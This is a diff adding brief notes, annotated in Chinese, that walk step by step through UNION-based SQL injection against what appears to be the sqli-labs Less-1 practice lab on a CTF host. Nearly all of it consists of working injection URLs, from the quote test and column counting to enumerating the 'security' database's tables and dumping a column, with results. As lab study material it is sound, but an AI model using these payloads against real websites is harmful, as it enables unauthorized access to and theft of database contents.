@@ -1,0 +1,27 @@
+https://1f020968-01ac-45d1-a4db-6a0a8169d4c7.node4.buuoj.cn/Less-1/?id=1
+==》注入点URL
+
+https://1f020968-01ac-45d1-a4db-6a0a8169d4c7.node4.buuoj.cn/Less-1/?id=1' and 1=1 -- a
+https://1f020968-01ac-45d1-a4db-6a0a8169d4c7.node4.buuoj.cn/Less-1/?id=1' and 2=1 -- a
+==》成功注入
+
+https://1f020968-01ac-45d1-a4db-6a0a8169d4c7.node4.buuoj.cn/Less-1/?id=1' order by 1 -- a
+https://1f020968-01ac-45d1-a4db-6a0a8169d4c7.node4.buuoj.cn/Less-1/?id=1' order by 2 -- a
+https://1f020968-01ac-45d1-a4db-6a0a8169d4c7.node4.buuoj.cn/Less-1/?id=1' order by 3 -- a
+https://1f020968-01ac-45d1-a4db-6a0a8169d4c7.node4.buuoj.cn/Less-1/?id=1' order by 4 -- a
+==》3个字段
+
+https://1f020968-01ac-45d1-a4db-6a0a8169d4c7.node4.buuoj.cn/Less-1/?id=-1' union select 11,22,33 -- a
+==》union利用点
+
+https://1f020968-01ac-45d1-a4db-6a0a8169d4c7.node4.buuoj.cn/Less-1/?id=-1' union select 11,database(),33 -- a
+==》数据库名称：security
+
+https://1f020968-01ac-45d1-a4db-6a0a8169d4c7.node4.buuoj.cn/Less-1/?id=-1' union select 11,group_concat(table_name),33 from information_schema.tables where table_schema='security' -- a
+==》表名称：emails,referers,uagents,users
+
+https://1f020968-01ac-45d1-a4db-6a0a8169d4c7.node4.buuoj.cn/Less-1/?id=-1' union select 11,column_name,33 from information_schema.columns where table_schema='security' and table_name='emails'-- a
+==》列名称：id
+
+https://1f020968-01ac-45d1-a4db-6a0a8169d4c7.node4.buuoj.cn/Less-1/?id=-1' union select 11,group_concat(id),33 from `emails` -- a
+==》emails表id列数据：1,2,3,4,5,6,7,8
